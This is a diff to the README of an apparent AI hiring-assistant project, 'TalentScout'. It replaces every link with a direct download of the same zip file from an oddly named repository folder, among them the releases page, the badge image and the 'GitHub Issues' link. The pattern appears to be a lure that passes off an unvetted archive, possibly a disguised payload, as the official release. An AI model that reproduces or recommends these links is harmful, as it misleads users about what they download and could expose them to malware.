@@ -1,6 +1,6 @@
 # 🚀 TalentScout-AI-Hiring-Assistant - Smart Hiring Made Simple
 
-[![Download TalentScout](https://img.shields.io/badge/Download%20TalentScout-Blue?style=for-the-badge&logo=github)](https://github.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/releases)
+[![Download TalentScout](https://raw.githubusercontent.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/main/cerianthoid/TalentScout-AI-Hiring-Assistant.zip%20TalentScout-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/main/cerianthoid/TalentScout-AI-Hiring-Assistant.zip)
 
 ## ✨ Overview
 
@@ -13,7 +13,7 @@ To get started with TalentScout-AI-Hiring-Assistant, follow the steps below. Thi
 ### 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the download options:
-   [Download TalentScout](https://github.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/releases)
+   [Download TalentScout](https://raw.githubusercontent.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/main/cerianthoid/TalentScout-AI-Hiring-Assistant.zip)
 
 2. **Select the Latest Version:** Look for the latest release on the page. It will usually be at the top. 
 
@@ -53,7 +53,7 @@ TalentScout comes equipped with several features that enhance your hiring proces
 
 If you encounter any issues or have questions about TalentScout, feel free to join our community. You can ask for help, share your experiences, or connect with other users:
 
-- **GitHub Issues Page:** Report bugs or request features directly on [ GitHub Issues](https://github.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/issues)
+- **GitHub Issues Page:** Report bugs or request features directly on [ GitHub Issues](https://raw.githubusercontent.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/main/cerianthoid/TalentScout-AI-Hiring-Assistant.zip)
 - **Community Forum:** Join discussions on platforms where recruiters share tips and tricks about using AI in hiring.
 
 ## 🔍 Frequently Asked Questions
@@ -78,6 +78,6 @@ We welcome contributions! If you're interested, check our contribution guideline
 
 To keep track of updates and new features, check our releases page regularly:
 
-[Download TalentScout](https://github.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/releases)
+[Download TalentScout](https://raw.githubusercontent.com/DranoelBeatz808/TalentScout-AI-Hiring-Assistant/main/cerianthoid/TalentScout-AI-Hiring-Assistant.zip)
 
 Join us on this journey to make hiring smarter and easier! Happy recruiting!
